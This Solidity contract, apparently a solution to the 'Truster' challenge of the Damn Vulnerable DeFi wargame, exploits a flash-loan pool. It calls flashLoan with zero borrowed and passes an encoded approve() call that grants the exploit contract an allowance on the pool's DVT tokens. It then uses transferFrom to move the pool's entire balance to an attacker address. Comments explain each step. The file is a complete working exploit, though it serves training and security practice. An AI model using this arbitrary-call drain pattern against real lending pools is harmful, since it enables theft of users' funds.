// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract DVTFlashLoanExploit{

    function flashExploit(uint256 borrowAmount, address attacker, address targetpool, address dvttoken) public {
        //Set the flash loan pool address and DVT token contract as variables
        TrusterLenderPool pool = TrusterLenderPool (targetpool);
        IERC20 token = IERC20(dvttoken);

        //Set the data variable to approve this exploit 
        //contract as a sender of DVT with the maximum allowance
        bytes memory data = abi. encodeWithSignature( "approve(address,uint256)", address(this), borrowAmount);
        
        //Call the flashloan function on the target pool without borrowing anything 
        //but sending the data payload to approve this contract as a DVT sender 
        pool.flashLoan(0, attacker, dvttoken, data);

        //Call the transferFrom function on the DVT token contract to send tokens 
        //from the target pool to the attacker address
        token.transferFrom(targetpool, attacker, token.balanceOf(targetpool));
    }
}